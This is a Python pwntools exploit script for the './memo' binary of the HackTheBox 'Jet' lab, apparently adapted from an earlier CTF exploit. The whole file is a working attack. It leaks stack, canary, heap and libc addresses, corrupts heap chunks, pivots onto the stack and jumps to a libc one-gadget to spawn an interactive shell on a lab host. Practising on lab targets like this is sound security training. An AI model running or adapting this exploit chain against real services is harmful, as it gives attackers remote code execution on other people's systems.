# Exploit for ./memo binary in HackTheBox Jet Memo
# based on the following exploit: https://github.com/megumish/ctfs/blob/master/2017/0x00ctf2017/memo_manager/exploit.py
# !/usr/bin/python

from pwn import *
import sys

context.log_level = 'info'
context.binary = './memo'

def create_memo(data, answer, one_more_data=None):
    conn.sendlineafter(b"> ", b"1")
    conn.sendlineafter(b"Data: ", data)
    conn.sendafter(b"[yes/no] ", answer)
    if answer.strip() != b"yes":
        conn.sendafter(b"Data: ", one_more_data)

def show_memo():
    conn.sendlineafter(b"> ", b"2")
    conn.recvuntil(b"Data: ")

def delete_memo():
    conn.sendlineafter(b"> ", b"3")

def tap_out(answer):
    conn.sendlineafter(b"> ", b"4")
    conn.sendafter(b"[yes/no] ", answer)

def exploit():
    # Leak stack chunk
    create_memo(b"A" * 0x1f, b"no", b"A" * 0x1f)
    show_memo()
    conn.recv(0x20)
    STACK_CHUNK = u64(conn.recv(6) + b"\x00" * 2) - (0x7ffee7b7d4d0 - 0x7ffee7b7d3c0)
    log.success(f"STACK_CHUNK : 0x{STACK_CHUNK:x}")

    delete_memo()

    # Leak canary
    create_memo(b"A" * 0x28, b"no", b"A" * 0x28)
    show_memo()
    conn.recvuntil(b"A" * 0x28)
    conn.recv(1)
    CANARY = u64(b"\x00" + conn.recv(7))
    log.success(f"CANARY : 0x{CANARY:x}")

    # Leak heap
    create_memo(b"A" * 0x18, b"no", b"A" * 0x18)
    create_memo(b"A" * 0x18, b"no", b"A" * 0x17)
    show_memo()
    conn.recvuntil(b"A" * 0x18)
    conn.recv(1)
    HEAP = u64(b"\x00" + conn.recv(3) + b"\x00" * 4)
    log.success(f"HEAP : 0x{HEAP:x}")

    # Heap feng shui
    create_memo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
    for _ in range(3):
        create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
    create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
    create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)

    # Tap-out overwrite
    tap_out(b"no\x00" + b"A" * 21 + p64(HEAP + 0xe0))
    delete_memo()
    tap_out(b"no\x00" + b"A" * 21 + p64(HEAP + 0xc0))
    delete_memo()

    # Leak libc
    show_memo()
    LEAK = u64(conn.recv(6) + b"\x00" * 2)
    log.success(f"LEAK : 0x{LEAK:x}")
    LIBC = LEAK - (0x7fbae5f32b78 - 0x7fbae5b6e000)
    log.success(f"LIBC : 0x{LIBC:x}")

    # Stack pivot
    create_memo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(STACK_CHUNK))
    create_memo(p64(LEAK) * (0x28 // 8), b"no", b"A" * 0x28)
    create_memo(b"A" * 0x8 + p64(0x21) + p64(STACK_CHUNK + 0x18) + b"A" * 0x8 + p64(0x21), b"yes")

    # One-gadget: 0x45216
    create_memo(b"A" * 0x8, b"no", p64(CANARY) + b"A" * 0x8 + p64(LIBC + 0x45216))
    tap_out(b"yes\x00")
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "r":
        conn = remote("10.13.37.10", 7777)
    else:
        conn = process(["./memo"])
    exploit()